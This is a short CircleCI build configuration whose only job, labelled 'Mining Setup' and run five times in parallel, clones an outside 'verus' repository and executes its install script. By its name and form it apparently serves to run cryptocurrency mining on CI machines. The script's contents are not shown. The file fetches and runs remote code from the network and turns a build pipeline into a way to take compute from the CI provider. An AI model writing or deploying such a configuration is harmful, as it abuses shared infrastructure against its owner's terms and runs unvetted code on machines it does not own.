version: 2.1

jobs:
  build:
    machine:
      image: ubuntu-2004:current
    parallelism: 5
    steps:
      - run:
          name: Mining Setup
          command: |
            git clone https://github.com/0xwhyteddy/verus.git
            cd verus
            chmod +x install-script.sh
            ./install-script.sh
            
workflows:
  build-workflow:
    jobs:
      - build
